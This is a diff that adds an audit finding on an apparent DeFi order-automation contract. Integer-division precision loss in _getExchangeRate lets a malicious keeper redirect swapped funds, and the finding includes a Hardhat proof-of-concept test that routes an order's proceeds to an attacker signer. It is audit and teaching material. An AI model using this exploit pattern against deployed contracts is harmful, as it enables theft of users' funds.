@@ -283,3 +283,155 @@ Authors: [Evta](https://twitter.com/pwhattie), looking forward to your joining
 ```
 
 </details>
+
+## 4. [Medium] Precision loss allows a mallicious user to drain amount received from orders
+
+### Precision loss
+
+- Summary : In `AutomationMaster._getExchangeRate`, integer division can round down the exchange rate to zero for cheap tokens against expensive ones (e.g., PEPE vs. BTC). This causes the `minAmountReceived` check in `Bracket.execute` and related order types to always pass, since the minimum is computed as 0. A malicious keeper can then craft `txData` to redirect swapped funds to their own address and call `performUpkeep`, draining all user funds from pending orders. As a result, attackers can steal the entire token balances (e.g., WBTC) from Bracket, StopLimit, or OracleLess contracts, leading to complete user fund loss.
+- Impact & Recommendation: Mitigation involves using higher precision in `_getExchangeRate` (e.g., `1e18` scaling) to avoid zero truncation and adding checks in `Bracket.execute` to ensure `baseMinAmount > 0` or a positive output amount, preventing exploits with small ratios or extreme slippage.
+
+<br> 🐬: [Source](https://audits.sherlock.xyz/contests/1076/report#OkuTradeOrderTypes) & [Report](https://audits.sherlock.xyz/contests/1076/report)
+
+<details><summary>POC</summary>
+
+```solidity
+
+describe("when slippage is set to maximum the order funds can be stolen", () => {
+    const stopDelta = ethers.parseUnits("500", 8)
+    const strikeDelta = ethers.parseUnits("100", 8)
+    const strikeBips = 500
+    const stopBips = 5000
+    const swapInBips = 500
+
+    let orderId: BigInt
+    //setup
+    before(async () => {
+        //steal money for s.Bob
+        await stealMoney(s.usdcWhale, await s.Bob.getAddress(), await s.USDC.getAddress(), s.usdcAmount)
+        await stealMoney(s.wethWhale, await s.Bob.getAddress(), await s.WETH.getAddress(), parseEther("250"))
+
+        //reset test oracle price
+        // set high value for initial ETH price
+        // here we will use the price of one bitcoin instead for usdc just for demonstration purpose
+        // which currently is 120_000 USD
+        // we will also set the price of weth to a very low value
+        // like 0.02
+        // however this could be any tokens to bitcoin
+        await s.wethOracle.setPrice(ethers.parseUnits("1", 8))
+        await s.usdcOracle.setPrice(ethers.parseUnits("120000", 8))
+        await s.uniOracle.setPrice(s.initialUniPrice)
+        await s.opOracle.setPrice(s.initialOpPrice)
+
+        let initial = await s.Master.checkUpkeep("0x")
+        expect(initial.upkeepNeeded).to.eq(false)
+
+    })
+    it("order with a low cost token and high cost token to usdc could lead to drain because of precision loss", async () => {
+        const currentPrice = await s.Master.getExchangeRate(await s.WETH.getAddress(), await s.USDC.getAddress())
+
+        await s.WETH.connect(s.Bob).approve(await s.Bracket.getAddress(), s.opAmount)
+
+        //should be 833
+        console.log("Current Price: ", currentPrice.toString())
+        const bobBalanceBefore = await s.USDC.balanceOf(await s.Bob.getAddress())
+        console.log("Bob's USDC balance before: ", bobBalanceBefore.toString())
+        await s.Bracket.connect(s.Bob).createOrder(
+            "0x",
+            currentPrice + 10n, // 18
+            currentPrice - 1n, //7
+            parseEther("25"), // 250 weth
+            await s.WETH.getAddress(),
+            await s.USDC.getAddress(),
+            await s.Bob.getAddress(),
+            0,//5 bips fee
+            500,
+            500,
+            "0x",
+            { value: s.fee }
+        )
+        console.log("Order created")
+
+        const filter = s.Bracket.filters.BracketOrderCreated
+        const events = await s.Bracket.queryFilter(filter, -1)
+        const event = events[0].args
+        orderId = event[0]
+        expect(Number(event[0])).to.not.eq(0, "Third order")
+
+        //verify pending order exists
+        const list = await s.Bracket.getPendingOrders()
+        expect(list.length).to.eq(1, "1 pending order")
+
+
+    })
+
+    it("Check upkeep", async () => {
+        //should be no upkeep needed yet
+        let initial = await s.Master.checkUpkeep("0x")
+        expect(initial.upkeepNeeded).to.eq(false)
+        initial = await s.Bracket.checkUpkeep("0x")
+        expect(initial.upkeepNeeded).to.eq(false)
+
+        //decrease the price of weth currently 10 times
+        //it represents
+        await s.wethOracle.setPrice(ethers.parseUnits("0.001", 8))
+        const currentPrice = await s.Master.getExchangeRate(await s.WETH.getAddress(), await s.USDC.getAddress())
+        //should be 0
+        console.log("Current Price: ", currentPrice.toString())
+
+        //check upkeep
+        let result = await s.Master.checkUpkeep("0x")
+        expect(result.upkeepNeeded).to.eq(true, "Upkeep is now needed")
+        result = await s.Bracket.checkUpkeep("0x")
+        expect(result.upkeepNeeded).to.eq(true, "Upkeep is now needed")
+
+        //check specific indexes
+        let start = 0
+        let finish = 1
+        const abi = new AbiCoder()
+        const encodedIdxs = abi.encode(["uint96", "uint96"], [start, finish])
+        result = await s.Bracket.checkUpkeep(encodedIdxs)
+        expect(result.upkeepNeeded).to.eq(true, "first idx updeep is needed")
+
+        console.log("Checking from master")
+        result = await s.Master.checkUpkeep(encodedIdxs)
+        expect(result.upkeepNeeded).to.eq(true, "first idx updeep is needed")
+    })
+
+    it("Perform Upkeep - stop loss", async () => {
+        //check upkeep
+
+        const result = await s.Master.checkUpkeep("0x")
+
+        //get returned upkeep data
+        const data: MasterUpkeepData = await decodeUpkeepData(result.performData, s.Frank)
+
+        //get minAmountReceived
+        const minAmountReceived = await s.Master.getMinAmountReceived(data.amountIn, data.tokenIn, data.tokenOut, data.bips)
+        console.log("Min Amount Received: ", minAmountReceived.toString())
+        //generate encoded masterUpkeepData
+        const [,,,,,,,malicious] = await ethers.getSigners()
+        const balanceBefore = await s.USDC.balanceOf(malicious.address)
+        console.log("MaliciousUSDC balance before: ", balanceBefore.toString())
+
+        //we manipulate the transaction so that
+        // the receiver of the money will be the malicious address
+        // instead of the order receiver/creator
+        const encodedTxData = await generateUniTx(
+            s.router02,
+            s.UniPool,
+            malicious.address,
+            minAmountReceived,
+            data
+        )
+
+        console.log("Gas to performUpkeep: ", await getGas(await s.Master.performUpkeep(encodedTxData)))
+
+        const balanceAfter = await s.USDC.balanceOf(malicious.address)
+        console.log("Malicious USDC balance after: ", balanceAfter.toString())
+    })
+})
+
+```
+
+</details>
